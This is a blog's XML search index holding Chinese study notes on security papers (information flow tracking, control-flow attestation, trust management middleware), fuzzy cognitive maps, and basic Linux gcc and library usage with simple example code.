<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>A multi-flow information flow tracking approach for proving quantitative hardware security properties</title>
    <url>/2020/09/03/A-multi-flow-information-flow-tracking-approach/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>hardware security; Information Flow Tracking (IFT); multi-flow IFT; security property</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/03/A-multi-flow-information-flow-tracking-approach/image-20210524202126427.png" alt="image-20210524202126427"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/9121656">https://ieeexplore.ieee.org/document/9121656</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>信息流跟踪</tag>
        <tag>硬件安全</tag>
        <tag>文献</tag>
      </tags>
  </entry>
  <entry>
    <title>C-FLAT Control-Flow Attestation for Embedded Systems Software</title>
    <url>/2021/05/19/Control-Flow-Attestation-for-Embedded-Systems-Software/</url>
    <content><![CDATA[<h2 id="Keywords"><a href="#Keywords" class="headerlink" title="Keywords"></a>Keywords</h2><p>远程认证；控制流攻击；嵌入式系统安全</p>
<h2 id="Problem-Setting"><a href="#Problem-Setting" class="headerlink" title="Problem Setting"></a>Problem Setting</h2><p><img src="/2021/05/19/Control-Flow-Attestation-for-Embedded-Systems-Software/image-20210519153200738.png" alt="image-20210519153200738"></p>
<ul>
<li>如果通过认证，则进入授权路径；否则进入无授权路径<ul>
<li>授权路径：N1-N2-N5-N4</li>
<li>无授权路径：N1-N3-N6-N4</li>
</ul>
</li>
<li>有控制流漏洞的程序（比如可能存在栈溢出的情况），可能会通过修改某些函数变量的值，间接修改函数返回的地址，这样就会导致程序按非预期的（非授权的）路径运行</li>
</ul>
<h2 id="System-Model"><a href="#System-Model" class="headerlink" title="System Model"></a>System Model</h2><p><img src="/2021/05/19/Control-Flow-Attestation-for-Embedded-Systems-Software/image-20210519160106939.png" alt="image-20210519160106939"></p>
<p><strong>目标：</strong>Ver 希望确定远程嵌入式系统 Prv 的运行时控制流</p>
<ol>
<li>通过静态分析，生成控制流图</li>
<li>测量每个可能的控制流路径，并存到数据库</li>
<li>Ver 向 Prv 发起挑战，Prv 执行一个函数，然后计算被执行的 CFG（控制流图）。这样会生成一个经过认证的数字签名，并存至数据库。</li>
</ol>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇论文的主要工作是提出一种认证，这种控制流认证会使系统的安全控制流程被写入数据库，这个数据库（我认为也可以是其他的一些数据结构）会在我们后续的研究中，比如安全状态观测和动态调整流程或许是有用的。</p>
<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a href="https://dl.acm.org/doi/10.1145/2976749.2978358">https://dl.acm.org/doi/10.1145/2976749.2978358</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>控制流</tag>
      </tags>
  </entry>
  <entry>
    <title>FCM</title>
    <url>/2020/07/30/FCM/</url>
    <content><![CDATA[<h2 id="模糊认知图（Fuzzy-Cognitive-Map，FCM）基本结构与原理"><a href="#模糊认知图（Fuzzy-Cognitive-Map，FCM）基本结构与原理" class="headerlink" title="模糊认知图（Fuzzy Cognitive Map，FCM）基本结构与原理"></a>模糊认知图（Fuzzy Cognitive Map，FCM）基本结构与原理</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><ol>
<li>基本的关系：</li>
</ol>
<p>　　模糊认知图(FCM) = 模糊逻辑(Fuzzy logic) + 神经网络(Neural Network)</p>
<ol>
<li>组成结构[1]</li>
</ol>
<p>　　模糊认知图是有向图，它由表示概念(concept)的节点和带有权值(weight)的弧线组成。模糊认知图中的所有值都是模糊值，比如可以取值：concept value ∈ [0,1]  weight value ∈ [-1,1]。一个concept可以影响其他的concept，同时，可以在构造模糊认知图的过程中不断增减互连关系或concept。一个具有n个概念节点的模糊认知图，可以用一个nxn阶矩阵W唯一确定。</p>
<p><img src="/2020/07/30/FCM/1931211-20200721105224495-580384554.png" alt="img"></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>　　每个concept都代表着系统的一项特征，它们可能用于表征系统中事件、行为、目标等。每个concept的值用一个数字Ai表示，这个值由系统变量的真实值转换而成。</p>
<p>　　两个concept：Ci与Cj之间的关系分三种情况：</p>
<p>　　　　Wij &gt; 0 　Ci与Cj正相关</p>
<p>　　　　Wij &lt; 0 　Ci与Cj负相关</p>
<p>　　　　Wij = 0 　Ci与Cj无因果关系</p>
<p>　　影响当前concept值(Ai)的因素有：该concept前时刻的值Aiold + 所有与它相连的其它concept值乘以权值后的总和。</p>
<p><img src="/2020/07/30/FCM/1931211-20200721121621259-1344638528.png" alt="img"></p>
<p><img src="/2020/07/30/FCM/1931211-20200721132104153-1572744170.png" alt="img"></p>
<h3 id="基本的应用方法"><a href="#基本的应用方法" class="headerlink" title="基本的应用方法"></a>基本的应用方法</h3><ol>
<li><p>首先由<strong>若干</strong>专家确定最适合描述该系统的concept（可以是系统的特征、状态、变量、系统的输入或输出等），并给定一个<strong>模糊值</strong>（fuzzy value）来表征concept之间的互连关系（正/负相关）</p>
</li>
<li><p>以上提到的模糊值（权值）需要考虑：</p>
</li>
</ol>
<p>　　a. 权重的符号，Ci是否会影响Cj</p>
<p>　　b. Ci对Cj的影响程度</p>
<p> 反之亦然。</p>
<ol>
<li><p>然后整合这些专家的意见，此时需要给每位专家一个<strong>信誉值（credibility）</strong>，在整合前，给每位专家的FCM乘以他们对应的信誉值。</p>
</li>
<li><p>经过初始化后的FCM，其中的concept根据设定会相互影响，直到：</p>
</li>
</ol>
<p>　　a. 到达平衡 或</p>
<p>　　b. 到达限定周期 或</p>
<p>　　c. 出现混沌行为</p>
<p>以上的结果是：构造单个FCM</p>
<p>但有时，我们还需构造多个FCM去描述系统的不同模块，然后用类似的方法将它们集成到一个<strong>增强的FCM</strong>中。</p>
<p>tip: 当构造多个不同模块的FCM（如两层FCM）后，其中某个FCM中的部分concept可能会影响其他FCM的concept。</p>
<p><img src="/2020/07/30/FCM/1931211-20200721174650554-753912085.png" alt="img"></p>
<h3 id="训练方法"><a href="#训练方法" class="headerlink" title="训练方法"></a>训练方法</h3><p>目的：调整权值weight</p>
<p>可能的方法：</p>
<p>　　a. Differential Hebbian learning (DHL，微分Hebbian学习方法)是一种无监督的学习方法，未在实际系统中广泛运用[2]。</p>
<p>　　b. Nonlinear Hebbian learning (NHL，非线性Hebbian学习方法)[3]</p>
<p>　　　　非线性 Hebbian 算法是一种无监督权值学习方法，在系统权值学习具有广泛的应用。它利用权值关联的原因节点状态值与结果节点状态值的乘积对连接权值进行无向修正 , 没有其他约束条件来提高学习效率和模型准确度。</p>
<h4 id="四种非监督学习方法-4"><a href="#四种非监督学习方法-4" class="headerlink" title="四种非监督学习方法[4]"></a>四种非监督学习方法[4]</h4><h5 id="1-Signal-Hebbian"><a href="#1-Signal-Hebbian" class="headerlink" title="1. Signal Hebbian"></a>1. Signal Hebbian</h5><ul>
<li>关联局部神经元信号。</li>
<li>如果神经元i和神经元j同步激活，则突触能量增强或突触能量减弱。</li>
</ul>
<h5 id="2-Competitive"><a href="#2-Competitive" class="headerlink" title="2. Competitive"></a>2. Competitive</h5><ul>
<li>用0-1竞争信号（神经元j的信号）调制信号突触差异。</li>
<li>突触只在突触后神经元获胜时才学习。</li>
<li>突触后神经元编码突触前信号模式。</li>
</ul>
<h5 id="3-Differential-Hebbian"><a href="#3-Differential-Hebbian" class="headerlink" title="3. Differential Hebbian"></a>3. Differential Hebbian</h5><ul>
<li>关联信号速度和神经元信号。</li>
<li>通过神经元信号的微分获得信号速度。</li>
</ul>
<h5 id="4-Differential-Competitive"><a href="#4-Differential-Competitive" class="headerlink" title="4. Differential Competitive"></a>4. Differential Competitive</h5><ul>
<li>结合Competitive和Differential Hebbian</li>
<li>仅在有变化时学习</li>
</ul>
<hr>
<h2 id="神经网络的基本结构与原理"><a href="#神经网络的基本结构与原理" class="headerlink" title="神经网络的基本结构与原理"></a>神经网络的基本结构与原理</h2><h3 id="结构-1"><a href="#结构-1" class="headerlink" title="结构"></a>结构</h3><p><img src="/2020/07/30/FCM/1931211-20200721180819407-385103004.png" alt="img"></p>
<h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理[5]"></a>原理[5]</h3><ol>
<li><p>随机生成神经元间的权值</p>
</li>
<li><p>对输入层神经元的数据加权求和再用激励函数激活，得到隐藏层的值</p>
</li>
<li><p>用类似的方法加权求和并激活，得到输出层的值</p>
</li>
<li><p>计算以上得到的输出层的值，与训练集中数据相比的误差大小（误差趋近于0收敛）</p>
</li>
<li><p>根据误差大小，计算残差</p>
</li>
<li><p>输出层残差值加权求和，得到隐藏层的残差</p>
</li>
<li><p>隐藏层残差加权求和。。。</p>
</li>
<li><p>根据残差值调整权值</p>
</li>
</ol>
<h3 id="如何进行训练"><a href="#如何进行训练" class="headerlink" title="如何进行训练"></a>如何进行训练</h3><p>如以上，梯度下降法</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] Stylios C , Georgopoulos V C , Groumpos P P . The Use of Fuzzy Cognitive Maps in Modeling Systems[C]// 5th IEEE Mediterranean Conference on Control and Systems. IEEE, 1997.</p>
<p>[2] 陈宁, 彭俊洁, 王磊,等. 模糊灰色认知网络的建模方法及应用[J]. 自动化学报, 2018, v.44(07):77-86.</p>
<p>[3] Elpiniki Papageorgiou, Chrysostomos Stylios, Peter Groumpos. Fuzzy Cognitive Map Learning Based on Nonlinear Hebbian Rule[M]// AI 2003: Advances in Artificial Intelligence. Springer Berlin Heidelberg, 2003.</p>
<p>[4] Neural Networks and Fuzzy Systems课程ppt</p>
<p>[5] <a href="https://www.cnblogs.com/cxhzy/p/10891137.html">https://www.cnblogs.com/cxhzy/p/10891137.html</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>FCM</tag>
      </tags>
  </entry>
  <entry>
    <title>A Practical Approach to Constructing a Knowledge Graph for Cybersecurity</title>
    <url>/2020/09/07/Knowledge-Graph-for-Cybersecurity/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Cybersecurity; Knowledge graph; Knowledge deduction</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/07/Knowledge-Graph-for-Cybersecurity/image-20210524202713003.png" alt="image-20210524202713003"></p>
<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a href="https://www.sciencedirect.com/science/article/pii/S2095809918301097">https://www.sciencedirect.com/science/article/pii/S2095809918301097</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>知识图谱</tag>
      </tags>
  </entry>
  <entry>
    <title>Customizable Framework for Managing Trusted Components Deployed on Middleware</title>
    <url>/2021/08/30/Middleware/</url>
    <content><![CDATA[<font face="楷体">用于管理部署在中间件上的受信任组件的可自定义框架</font>

<h2 id="1-KeyWrods"><a href="#1-KeyWrods" class="headerlink" title="1 KeyWrods"></a>1 KeyWrods</h2><p>可信计算，可信管理，可信保护，可信度量，中间件</p>
<h2 id="2-可信管理模型"><a href="#2-可信管理模型" class="headerlink" title="2 可信管理模型"></a>2 可信管理模型</h2><h3 id="2-1-可信系统的定义"><a href="#2-1-可信系统的定义" class="headerlink" title="2.1 可信系统的定义"></a>2.1 可信系统的定义</h3><p>丑国NSF认为可信系统是：按预期工作，且不易被颠覆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">behaves as expected, but, more importantly, continues to produce expected behavior and are not susceptible to subversion</span><br></pre></td></tr></table></figure>
<p>作者Minghui Zhou等人认为</p>
<script type="math/tex; mode=display">the\ \ trust = trust\ \ relationship+trust\ \ property+trust\ \ entity</script><ul>
<li>trust relationship：实际就是 trustor 和 trustee 的关系，turstor 信任 trustee，trustee 被 trustor 信任。</li>
<li>trust properties: 包括安全性、隐私、及时性、可用性和可靠性等</li>
<li>trust entity: trustor 和 trustee 均为信任实体</li>
</ul>
<p>在不同的应用领域信托人（trustor）需要受托人（trustee）担保不同的信托属性。受托人（trustee）可以位于计算机系统中的各层：硬件、网络、操作系统、中间件、应用程序服务。</p>
<p><strong>该文关注的信托实体是网络上开放的动态的软件组件</strong><br>软件组件是否可信，取决于：提供服务时的安全性、可靠性和及时性等。如果满足其声明和预期的信任功能，则该软件组件是可信的。</p>
<h3 id="2-2-可信管理的四层模型"><a href="#2-2-可信管理的四层模型" class="headerlink" title="2.2 可信管理的四层模型"></a>2.2 可信管理的四层模型</h3><p><img src="/2021/08/30/Middleware/image-20210830203705391.png" alt="image-20210830203705391"></p>
<ul>
<li>The Communication Layer：通信层。负责信任实体时间的通信，除了提供可靠通信，还提供了可信通信需求（比如SSL）</li>
<li>The Management Layer：管理层。是管理可信度和信任关系的核心。<ul>
<li>Trust Policy Customization 信任策略定制，有三种类型<ul>
<li>开发人员可以根据信任要求指定需要保证的信任属性。</li>
<li>委托人或开发人员可以（重新）定义与特定受托人相关的信任属性的不同度量模型，即可信度度量方法和标准。</li>
<li>用户可以配置如何在运行时权衡信任属性（这会需要重新配置信任机制）</li>
</ul>
</li>
</ul>
</li>
<li>The Infrastructure Layer：基础设施层。为保证不同的信托属性提供具体的信托服务，如安全性、容错性等。</li>
</ul>
<h3 id="2-3-信托实体"><a href="#2-3-信托实体" class="headerlink" title="2.3 信托实体"></a>2.3 信托实体</h3><p>如上文提到的，这里的信托实体就是应用程序组件。</p>
<h4 id="2-3-1-可信组件"><a href="#2-3-1-可信组件" class="headerlink" title="2.3.1 可信组件"></a>2.3.1 可信组件</h4><p>受托人可以声明其在提供服务时可以担保的信托财产。例如，当银行机构提供金融服务时，它必须声明其服务是安全可靠的，否则客户将对银行服务不满意，然后不再来该机构寻求任何服务。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>可信组件的结构</th>
</tr>
</thead>
<tbody>
<tr>
<td>命名信息</td>
</tr>
<tr>
<td>接口描述</td>
</tr>
<tr>
<td>资源/组件引用</td>
</tr>
<tr>
<td>信任属性声明</td>
</tr>
</tbody>
</table>
</div>
<p>例如电子书店的可信组件如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">entity</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entity-name</span>&gt;</span>Order<span class="tag">&lt;/<span class="name">entity-name</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">interface</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">provide-method</span>&gt;</span> … <span class="tag">&lt;/<span class="name">provide-method</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">request-method</span>&gt;</span> … <span class="tag">&lt;/<span class="name">request-method</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">interface</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">entity-ref</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">ent-ref-name</span>&gt;</span>Customer<span class="tag">&lt;/<span class="name">ent-ref-name</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">entity-ref</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">resource-ref</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">res-ref-name</span>&gt;</span>odbc/orders<span class="tag">&lt;/<span class="name">res-ref-name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">res-type</span>&gt;</span>DataSource<span class="tag">&lt;/<span class="name">res-type</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">resource-ref</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">entity</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">trust-property</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">trust-prop-type</span>&gt;</span> security <span class="tag">&lt;/<span class="name">trust-prop-type</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">role-ref</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">role-ref-name</span>&gt;</span> administrator <span class="tag">&lt;/<span class="name">role-ref-name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">trust-prop-policy</span>&gt;</span> SecurityPolicy <span class="tag">&lt;/<span class="name">trust-prop-policy</span>&gt;</span></span><br><span class="line">    …… </span><br><span class="line">  <span class="tag">&lt;/<span class="name">role-ref</span>&gt;</span> </span><br><span class="line">  …… </span><br><span class="line"><span class="tag">&lt;/<span class="name">trust-property</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="2-4-度量模型"><a href="#2-4-度量模型" class="headerlink" title="2.4 度量模型"></a>2.4 度量模型</h3><p>可以将复杂的信任属性拆分成若干简单的子属性，然后单独定义表达式，以便更好的度量与管理。</p>
<h4 id="2-4-1-基于单类型的信任公式"><a href="#2-4-1-基于单类型的信任公式" class="headerlink" title="2.4.1 基于单类型的信任公式"></a>2.4.1 基于单类型的信任公式</h4><p>$t$ 时刻，软件组件 $u$ 的可信度计算公式</p>
<script type="math/tex; mode=display">STW(u,t)=\sum_{c\in TrustChars}w_c\times TW_c(u,t)</script><p>其中，$W_c$ 为信任属性 $C$ 在同一信任指标中的权值，$TW_c(u,t)$ 表示软件组件 $U$ 中 $C$ 信任属性 的可信度，$TrustChars$ 表示信任属性集。</p>
<h4 id="2-4-2-基于属性定制的信任公式"><a href="#2-4-2-基于属性定制的信任公式" class="headerlink" title="2.4.2 基于属性定制的信任公式"></a>2.4.2 基于属性定制的信任公式</h4><p>我们无法定义满足所有要求的公式，所以需要根据特定的场景，根据应用系统的要求和用户的期望定制特定的公式。比如当我们关注系统安全特性的时候，我们可以定制与安全相关的度量公式。</p>
<ul>
<li>安全性</li>
</ul>
<script type="math/tex; mode=display">TW_{Security}(u,t)=MTBF/(MTBF+MTTR)$$​

其中 $MTBF$ 意味着故障平均时间（mean time between failures）

$MTTR$​ 意味着从故障中恢复的平均时间（mean time to repair/recover from failures）

* 及时性

$$TW_{Timeliness}(u,t)=\frac{1}{t}$$​​

其中 $t$ 为计算时间，计算时间越短，及时性越好

* 可靠性

$$TW_{Reliability}(u,t)=MTBF/(1+MTBF)$$​

可靠性：系统在指定环境，指定时间内完成任务的概率

* 除了定制属性外，还可以定制属性的权重。权重和需为 1

$$\sum_{Trustchars}w_c=1</script><h3 id="2-5-信任策略"><a href="#2-5-信任策略" class="headerlink" title="2.5 信任策略"></a>2.5 信任策略</h3><p>信任策略可以用定制工具在运行时重新定义。</p>
<h2 id="3-中间件"><a href="#3-中间件" class="headerlink" title="3 中间件"></a>3 中间件</h2><p>最流行的模型是<strong>基于对象</strong>的中间件，其中应用程序被构造成对象，这些对象通过位置透明的方法调用进行交互。信任管理的原型系统已经部署在北大的 PKUAS 的 J2EE</p>
<h3 id="3-1-PKUAS"><a href="#3-1-PKUAS" class="headerlink" title="3.1 PKUAS"></a>3.1 PKUAS</h3><p>是一个基于组件的中间件平台，为部署和执行应用组件提供了环境，其中<strong>容器</strong>为组件实例提供运行空间。</p>
<p>为了支持组件实例的执行，容器能够捕获组件的所有详细信息（如界面、约束和关系），这是通过 PKUAS 的<font color="blue">反射机制</font>实现的。</p>
<p>通过<strong>容器</strong>，组件获得公共服务的支持，实现应用的交互和非功能要求。</p>
<h3 id="3-2-整合信任管理"><a href="#3-2-整合信任管理" class="headerlink" title="3.2 整合信任管理"></a>3.2 整合信任管理</h3><p>将信任管理<strong>作为一种公共服务</strong>纳入 PKUAS</p>
<p>信任组件装配工具将信任组件整合在一起，用于定制和调整信任属性。</p>
<p>通过与装配工具交互，容器可以提取有关组件和应用程序信任属性的所有信息，然后将其供应给信托管理。</p>
<h3 id="3-3-信任组件的组装"><a href="#3-3-信任组件的组装" class="headerlink" title="3.3 信任组件的组装"></a>3.3 信任组件的组装</h3><p>装配实际上是为每个应用程序定义一个装配说明，并且只有<strong>在部署时才形成具体的应用程序</strong>。</p>
<p>在组装应用程序时，我们不仅要明确涉及哪些信任组件，还要声明将为用户保证哪些信任属性。</p>
<h3 id="3-4-信任管理的使用"><a href="#3-4-信任管理的使用" class="headerlink" title="3.4 信任管理的使用"></a>3.4 信任管理的使用</h3><p>通过使用 PKUAS 和在 PKUAS 上实施的信托管理服务，开发人员可以指定组件和应用程序的信托属性，并通过自定义信托策略来定义可信度的衡量模型。</p>
<p>基本流程：</p>
<ol>
<li>指定可保证的信任属性，以及信任组件在请求受信任服务时期望的信任要求</li>
<li>为信任组件提供信任策略，以评估可信度</li>
<li>使用装配工具组装信任组件以构建信任程序</li>
<li>在 PKUAS 上部署和运行应用程序</li>
<li>使用自定义工具自定义组件的信任策略</li>
</ol>
<p>当部署的应用程序在 PKUAS 上运行时，信任管理机制监控应用程序，计算组件的可信度数，通知用户值得信赖的程度，并根据策略调整信任属性。</p>
<h3 id="3-5-执行情况的评估"><a href="#3-5-执行情况的评估" class="headerlink" title="3.5 执行情况的评估"></a>3.5 执行情况的评估</h3><font color="blue">信托管理的加入会影响系统性能。这方面可以进行优化</font>

<p>最后，该文提出未来会研究如何<strong>有效的进行运行时评估</strong>（应该在管理框架中增加一些自动化功能，以减轻开发人员的一些负担）。</p>
<h2 id="4-Ref"><a href="#4-Ref" class="headerlink" title="4 Ref"></a>4 Ref</h2><p><a href="https://ieeexplore.ieee.org/document/1467909">https://ieeexplore.ieee.org/document/1467909</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>可信计算</tag>
        <tag>定制化公式</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux程序设计[笔记]</title>
    <url>/2021/06/22/Linux%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章 基础知识"></a>第一章 基础知识</h2><h3 id="1-1-Linux-程序设计常识"><a href="#1-1-Linux-程序设计常识" class="headerlink" title="1.1 Linux 程序设计常识"></a>1.1 Linux 程序设计常识</h3><ul>
<li>GCC：GNU 编译器集，它包括 GNU C 编译器</li>
<li>G++：C++ 编译器，是 GCC 的一部分</li>
<li>C 语言编译器被简称为 cc</li>
</ul>
<h3 id="1-2-一些标准路径"><a href="#1-2-一些标准路径" class="headerlink" title="1.2 一些标准路径"></a>1.2 一些标准路径</h3><ul>
<li><code>/bin</code>：二进制文件目录，用于存放启动系统时用到的程序</li>
<li><code>/usr/bin</code>：用户二进制文件目录，用于存放用户使用的标准程序</li>
<li><code>/usr/local/bin</code>：本地二进制文件目录，用于存放软件安装的程序</li>
<li><code>/usr/sbin</code> 和 <code>/sbin</code>：系统管理员登陆后使用 PATH 变量可能还包含，系统管理程序的目录</li>
<li><code>/opt</code>：可选的操作系统组件和第三方应用程序可能被安装在此</li>
<li><code>lib</code> 和 <code>/usr/lib</code>：标准系统库文件</li>
</ul>
<p>关键位置：</p>
<ul>
<li>系统管理员一般喜欢使用 <code>/opt</code> 和 <code>/usr/local</code> 因为升级操作系统时只有这两个目录需要保留</li>
<li>gcc 一般位于 <code>/usr/bin</code> 或 <code>/usr/local/bin</code> 或 <code>/usr/lib/gcc</code> 中</li>
<li>C 语言头文件位于 <code>/usr/include</code> 及其子目录。哪些依赖 Linux 版本的头文件通常在 <code>/usr/include/sys</code> 和 <code>/usr/include/linux</code> 中</li>
</ul>
<h3 id="1-3-头文件与库文件之-gcc-使用"><a href="#1-3-头文件与库文件之-gcc-使用" class="headerlink" title="1.3 头文件与库文件之 gcc 使用"></a>1.3 头文件与库文件之 gcc 使用</h3><ul>
<li><p><code>-I/目录</code>：包含非标准位置的头文件</p>
</li>
<li><p><code>-L/目录</code>： 添加非标准位置的库</p>
</li>
</ul>
<hr>
<p><strong>库文件名</strong>：libc 指 C语言库，libm 指数学库；后缀 <code>.a</code> 代表传统静态函数库，<code>.so</code> 代表共享函数库</p>
<ul>
<li>拓展<ul>
<li><strong>静态库的缺点</strong>：如果同时运行很多程序都使用来自同意函数库的函数，内存中就会有同一函数的多份副本，造成资源浪费。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-4-静态库实验"><a href="#1-4-静态库实验" class="headerlink" title="1.4 静态库实验"></a>1.4 静态库实验</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fred.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fred</span><span class="params">(<span class="keyword">int</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fred: we passed %d\n&quot;</span>, arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bill.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bill</span><span class="params">(<span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bill: we passed %s\n&quot;</span>, arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>gcc -c bill.c fred.c</code> 只编译不链接，生成两个对应的 <code>.o</code> 文件</li>
<li>为库文件创建一个头文件 lib.h</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// lib.h</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bill</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fred</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>编写调用程序 program.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;lib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bill(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>编译调用程序并为编译器显示指定目标文件，并与编译好的 bill.o 链接</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">gcc -c program.c</span><br><span class="line">gcc -o program program.o bill.o</span><br><span class="line">./program </span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/22/Linux%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210622115212840.png" alt="image-20210622115212840"></p>
<hr>
<h4 id="1-4-1-将目标文件添加到归档文件（创建并使用一个库文件）"><a href="#1-4-1-将目标文件添加到归档文件（创建并使用一个库文件）" class="headerlink" title="1.4.1 将目标文件添加到归档文件（创建并使用一个库文件）"></a>1.4.1 将目标文件添加到归档文件（创建并使用一个库文件）</h4><ul>
<li><p><code>ar crv libfoo.a bill.o fred.o</code></p>
</li>
<li><p>使用库文件</p>
<ul>
<li>方法一：在当前文件列表直接使用：<code>gcc -o program program.o libfoo.a</code></li>
<li>方法二：使用 <code>-L</code> 访问函数库：<code>gcc -o program program.o -L. -lfoo</code><ul>
<li><code>-L.</code> 表示在当前目录查找库函数；<code>-lfoo</code> 表示使用 libfoo.a 的函数库（或者 libfoo.so 如果存在的话）</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-5-共享库"><a href="#1-5-共享库" class="headerlink" title="1.5 共享库"></a>1.5 共享库</h3><ul>
<li><strong>与静态库的区别</strong>：程序本身不在包含库文件的代码，而是引用运行时可访问的共享代码。当编译好的程序被装载到内存中执行时，函数引用被解析成对共享库的调用。</li>
<li><strong>共享库的优点</strong>：<ul>
<li>系统只需要保留一个共享库副本</li>
<li>共享库的更新可以独立于依赖它的程序</li>
</ul>
</li>
</ul>
<h4 id="1-5-1-如何配置使系统搜索额外的共享库位置"><a href="#1-5-1-如何配置使系统搜索额外的共享库位置" class="headerlink" title="1.5.1 如何配置使系统搜索额外的共享库位置"></a>1.5.1 如何配置使系统搜索额外的共享库位置</h4><ul>
<li>修改 <code>/etc/ld.so.conf</code> 文件</li>
<li>执行 <code>ldconfig</code> 生效</li>
</ul>
<h4 id="1-5-2-如何查看一个程序需要的共享库"><a href="#1-5-2-如何查看一个程序需要的共享库" class="headerlink" title="1.5.2 如何查看一个程序需要的共享库"></a>1.5.2 如何查看一个程序需要的共享库</h4><ul>
<li><code>ldd 程序名</code>，比如</li>
</ul>
<p><img src="/2021/06/22/Linux%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210622164051603.png" alt="image-20210622164051603"></p>
